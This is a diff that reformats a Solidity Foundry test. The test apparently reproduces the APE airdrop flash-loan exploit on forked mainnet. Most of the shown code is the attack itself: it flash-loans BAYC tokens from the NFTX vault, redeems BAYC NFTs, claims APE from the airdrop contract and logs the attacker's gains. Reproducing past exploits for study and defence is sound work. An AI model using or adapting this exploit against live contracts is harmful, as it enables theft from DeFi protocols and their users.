@@ -12,41 +12,34 @@ https://dashboard.tenderly.co/tx/mainnet/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca1
 https://tools.blocksec.com/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098*/
 
 interface IAirdrop {
+
     function claimTokens() external;
+
 }
 
 interface INFTXVault {
-    function redeem(
-        uint256 amount,
-        uint256[] memory specificIds
-    ) external returns (uint256[] memory);
-    function flashLoan(
-        address receiver,
-        address token,
-        uint256 amount,
-        bytes memory data
-    ) external returns (bool);
+
+    function redeem(uint256 amount, uint256[] memory specificIds) external returns (uint256[] memory);
+    function flashLoan(address receiver, address token, uint256 amount, bytes memory data) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
-    function mint(
-        uint256[] memory tokenIds,
-        uint256[] memory amounts
-    ) external returns (uint256);
+    function mint(uint256[] memory tokenIds, uint256[] memory amounts) external returns (uint256);
+
 }
 
 interface IBAYCi {
+
     function setApprovalForAll(address operator, bool approved) external;
     function transferFrom(address from, address to, uint256 tokenId) external;
+
 }
 
 contract ContractTest is Test {
+
     IBAYCi bayc = IBAYCi(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
-    INFTXVault NFTXVault =
-        INFTXVault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
-    IAirdrop AirdropGrapesToken =
-        IAirdrop(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
+    INFTXVault NFTXVault = INFTXVault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
+    IAirdrop AirdropGrapesToken = IAirdrop(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
     IERC20 ape = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
-    bytes32 private constant CALLBACK_SUCCESS =
-        keccak256("ERC3156FlashBorrower.onFlashLoan");
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     function setUp() public {
         vm.createSelectFork("mainnet", 14_403_948); // fork mainnet at block 14403948
@@ -54,37 +47,14 @@ contract ContractTest is Test {
 
     function test() public {
         vm.startPrank(0x6703741e913a30D6604481472b6d81F3da45e6E8);
-        bayc.transferFrom(
-            0x6703741e913a30D6604481472b6d81F3da45e6E8,
-            address(this),
-            1060
-        );
-        emit log_named_decimal_uint(
-            "Before exploiting, Attacker balance of APE is",
-            ape.balanceOf(address(this)),
-            18
-        );
+        bayc.transferFrom(0x6703741e913a30D6604481472b6d81F3da45e6E8, address(this), 1060);
+        emit log_named_decimal_uint("Before exploiting, Attacker balance of APE is", ape.balanceOf(address(this)), 18);
         NFTXVault.approve(address(NFTXVault), type(uint256).max);
-        NFTXVault.flashLoan(
-            address(this),
-            address(NFTXVault),
-            5_200_000_000_000_000_000,
-            ""
-        ); // flash loan 5.2 BAYC tokens from the NFTX Vault
-        emit log_named_decimal_uint(
-            "After exploiting, Attacker balance of APE is",
-            ape.balanceOf(address(this)),
-            18
-        );
+        NFTXVault.flashLoan(address(this), address(NFTXVault), 5_200_000_000_000_000_000, ""); // flash loan 5.2 BAYC tokens from the NFTX Vault
+        emit log_named_decimal_uint("After exploiting, Attacker balance of APE is", ape.balanceOf(address(this)), 18);
     }
 
-    function onFlashLoan(
-        address,
-        address,
-        uint256,
-        uint256,
-        bytes memory
-    ) external returns (bytes32) {
+    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
         uint256[] memory blank = new uint256[](0);
         // The attacker used the borrowed BAYC tokens to redeem the following BAYC NFTs
         NFTXVault.redeem(5, blank);
@@ -109,12 +79,12 @@ contract ContractTest is Test {
         return CALLBACK_SUCCESS;
     }
 
-    function onERC721Received(
-        address _operator,
-        address _from,
-        uint256 _tokenId,
-        bytes calldata _data
-    ) external pure returns (bytes4) {
+    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data)
+        external
+        pure
+        returns (bytes4)
+    {
         return this.onERC721Received.selector;
     }
+
 }
